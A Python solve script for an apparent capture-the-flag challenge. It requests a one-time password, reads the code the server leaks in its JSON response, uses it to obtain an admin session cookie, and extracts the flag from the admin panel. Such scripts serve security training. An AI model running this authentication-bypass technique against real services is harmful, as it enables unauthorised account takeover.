#!/usr/bin/env python3
import re
import sys
import requests

BASE_URL = "https://chw-otp-ctf.vercel.app"
EMAIL = "admin@chw.local"


def fail(msg: str) -> None:
    print(f"[!] {msg}")
    sys.exit(1)


def main() -> None:
    s = requests.Session()

    # 1) Trigger OTP generation and read leaked OTP from JSON response
    r = s.post(
        f"{BASE_URL}/api/send-otp",
        json={"email": EMAIL},
        timeout=15,
    )
    if r.status_code != 200:
        fail(f"send-otp failed with status {r.status_code}")

    try:
        data = r.json()
    except Exception:
        fail("send-otp response is not JSON")

    otp = data.get("otp")
    if not otp:
        fail("OTP not found in response (leak missing)")

    print(f"[+] Leaked OTP: {otp}")

    # 2) Verify OTP to get authenticated admin_session cookie
    r = s.post(
        f"{BASE_URL}/api/verify-otp",
        json={"email": EMAIL, "otp": otp},
        timeout=15,
    )
    if r.status_code != 200:
        fail(f"verify-otp failed with status {r.status_code}")

    try:
        data = r.json()
    except Exception:
        fail("verify-otp response is not JSON")

    if not data.get("success"):
        fail(f"OTP verification failed: {data}")

    if s.cookies.get("admin_session") != "authenticated":
        fail("admin_session cookie not set")

    print("[+] Admin session established")

    # 3) Access admin panel and extract flag
    r = s.get(f"{BASE_URL}/admin-panel", timeout=15)
    if r.status_code != 200:
        fail(f"admin-panel returned status {r.status_code}")

    html = r.text.replace("<!-- -->", "")
    m = re.search(r"CHW\{[^}]+\}", html)
    if not m:
        fail("flag not found in admin panel")

    print(f"[+] Flag: {m.group(0)}")


if __name__ == "__main__":
    main()
